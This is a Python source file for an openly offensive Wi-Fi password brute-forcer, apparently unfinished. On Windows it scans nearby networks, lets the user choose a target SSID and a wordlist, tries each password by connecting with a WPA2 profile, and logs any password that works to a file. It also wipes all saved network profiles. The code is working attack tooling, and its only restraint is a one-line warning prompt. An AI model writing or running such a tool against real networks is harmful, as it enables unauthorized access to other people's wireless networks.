import time
import os
import subprocess
import sys
import platform
os_name = platform.system()
if os_name == 'Windows':
    os.system("cls")
    try:
        import pywifi
        from pywifi import const
    except ImportError:
        print("[-] pywifi Package not found")
elif os_name in ['Linux', 'darwin']:
    os.system('clear')
    if os_name == 'Linux':
        nmcli_check = subprocess.run(['which', 'nmcli'], capture_output=True, text=True)
        print("[+] Found nmcli Package")
        if not nmcli_check.stdout.strip():
            print("[-] NetworkManager (nmcli) not found. Linux brute-forcing requires nmcli.")
            sys.exit()

wordlist = "not defined"
target = "not defined".strip("'")

# Windows Code
if os_name == 'Windows':
    try:    
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface_name = iface.name()
        status = iface.status
    except Exception as ex:
        print(f"[-] an Error as Accured: {ex}")
        sys.exit()

    Scan_Timer = 2
    def get_networks():
        iface.scan()
        time.sleep(Scan_Timer)   # Give some time for the scan to complete
        return iface.scan_results()

    def wordlist_listing():
        global wordlist  # Declare wordlist as global
        path = input("Enter full file path: ").strip().strip('"')
        path = os.path.expanduser(path)             # allow ~/foo style
        path = os.path.abspath(path)                # normalise
        if os.path.isfile(path):
            print("[+] Found file:", path)
            wordlist = path  # Now this will modify the global variable
            time.sleep(0.5)
            os.system("cls")  
            Windows_Boot()
            return path
        else:
            print("[-] Failed to find file. Check path and permissions.")
            return None
        
    def security(network):
        if len(network.akm) == 0:
            return "🔓 Open"
        elif const.AKM_TYPE_WPA2PSK in network.akm:
            return "🔒 WPA2"
        elif const.AKM_TYPE_WPAPSK in network.akm:
            return "🔒 WPA"
        else:
            return "🔒 Other"

    def scan():
        print("scanning..")
        try:
            networks = get_networks()
            print(f"Found {len(networks)} networks:\n")
            for network in networks:
            # If SSID is empty or only whitespace, show it as a hidden network
                ssid_raw = network.ssid or ""
                ssid = ssid_raw.strip()  
                ssid_display = ssid if ssid else "Hidden network"

                print(f"Network: {ssid_display}")
                print(f"Signal: {network.signal}")
                print(f"MAC adress: {network.bssid}")
                print(f"security type: {security(network)}")
                print("-" * 30)
            return networks  # Return all networks instead of just last network
        except:
            print("[!] an error had eccuried. please open wifi network so it can scan.")

    def target_selecter():

        networks = get_networks()
        target_selecters = input("Enter your target ssid(name): ")
        for network in networks:
            if network.ssid == target_selecters:
                global target 
                target = target_selecters
                print("[+] Founded Target")
                time.sleep(1)
                os.system("cls")
                Windows_Boot()
                return network
        print("[-] not found target ssid")


    def create_profile(ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        return profile


    Connection_Timer = 2
    def Connecting():
        global target
        global wordlist

        
        print(f"Current interface status: {iface.status()}")

        if target == "not defined":
            print("[-] Please select a target network first (option 2)")
            time.sleep(2)
            return
        
        if wordlist == "not defined":
            print("[-] Please load a wordlist first (option 1)")
            time.sleep(2)
            return
        
        # Check if wordlist file exists
        if not os.path.isfile(wordlist):
            print(f"[-] Wordlist file not found: {wordlist}")
            time.sleep(2)
            return
        
        if iface.status() == const.IFACE_DISCONNECTED:
            print("[+] Interface ready")
        else:
            print("[!] Interface not ready, disconnecting...")
            iface.disconnect()
            time.sleep(2)

        attack_choice = input("THIS ATTACK WILL DELETE ARE YOUR NETWORK PROFILES DO YOU WANT TO  PROCCED? (Enter)")
        if not attack_choice:
            pass
        else:
            return
        
        Warning = input("Do not Use this Program for malicious purposses its illgeal USE IT AT YOUR OWN RISK (Enter)")

        print(f"\n🔓 Starting brute-force attack on: {target}")
        print(f"📄 Using wordlist: {wordlist}")
        print("-" * 50)
        
        attempt_count = 0
        
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for password_line in f:
                    password = password_line.strip()  # Remove newline and whitespace
                    
                    if not password:  # Skip empty lines
                        continue
                    
                    attempt_count += 1
                    print(f"[Attempt {attempt_count}] Trying password: {password}")
                    
                    try:
                        # Create a profile for this network
                        profile = create_profile(target, password)
                        iface.remove_all_network_profiles()
                        tmp_profile = iface.add_network_profile(profile)
                        
                        # Try to connect
                        iface.connect(tmp_profile)
                        time.sleep(Connection_Timer)  # Wait for connection to establish
                        
                        # Check if successfully connected
                        if iface.status() == const.IFACE_CONNECTED:
                            print("\n" + "="*50)
                            print("✅ SUCCESS! PASSWORD FOUND!")
                            print("="*50)
                            print(f"🔑 Network: {target}")
                            print(f"🔐 Password: {password}")
                            print("="*50 + "\n")
                            
                            # Save success to a file
                            with open("cracked_passwords.txt", "a") as result:
                                result.write(f"Network: {target} | Password: {password}\n")
                            
                            time.sleep(3)
                            return

                    except Exception as e:
                        pass  # Continue to next password if connection fails
            
            print("\n" + "-"*50)
            print(f"[-] No password found after {attempt_count} attempts")
            print("-"*50 + "\n")
        except FileNotFoundError:
            print(f"[-] Wordlist file not found: {wordlist}")
        except Exception as e:
            print(f"[-] Error during brute-force: {e}")
        
        time.sleep(2)

    def Windows_Boot():
        global Scan_Timer
        global Connection_Timer
        os.system('cls')
        print(f"""
            wifi interface: {iface_name}                            

            Scan_Timer = {Scan_Timer} Secs
            Connection/Attack_Timer = {Connection_Timer} Secs

        1. Wordlist({wordlist})
        2. target({target}) NETWORK
        3. Scan
        4. Connect/Attack
        5. Change Timers
        6. Menu
        7. Exit
        """)
        while True:
            choice = input("BruteForcer~$ ")
            if choice == "1":
                wordlist_listing()
            elif choice == "2":
                target_selecter()
            elif choice == "3":
                scan()
            elif choice == "4":
                Connecting()
            elif choice == "5":
                print("1- Change Scan Timer, 2-Change Connecter/Attack Timer per password")
                user_timer_input = input("~$ ")
                if not user_timer_input in ['1', '2']:
                    return
                Warn = "[NOTICE] if you enter a lower number than 1 you may experince some Bugs and lags and this Code wont fully Work because of the Connection to Establish Needs"
                if user_timer_input == '1':
                    try:
                        print(Warn)
                        Scan_Timer = int(input("Enter New Scan Timer (Number) "))
                    except ValueError as VE:
                        print("[-] Please Enter an invaild Number")
                        print("[!] Try Again.")
                        Scan_Timer = 2 # Default Timer to ensure no Errors in the future
                elif user_timer_input == '2':
                    try:
                        print(Warn)
                        Connection_Timer = int(input("Enter New Scan Timer (Number) "))
                    except ValueError as VE:
                        print("[-] Please Enter an invaild Number")
                        print("[!] Try Again.")
                        Connection_Timer = 2 # Default Timer to ensure no Errors in the future
            elif choice == "6":
                Windows_Boot()
            elif choice == "7":
                return
            else:
                print("[-] invalid TypeError")






def Main():
    if os_name == 'Windows':
        Windows_Boot()
    elif os_name == 'Linux':
        print("[-] os not supported yet")
        pass
    elif os_name == 'Darwin':
        print("[-] os not supported yet")
        pass
    else:
        print("[-] os not supported.")
        pass

# Main() # for testing this code is not offically finished
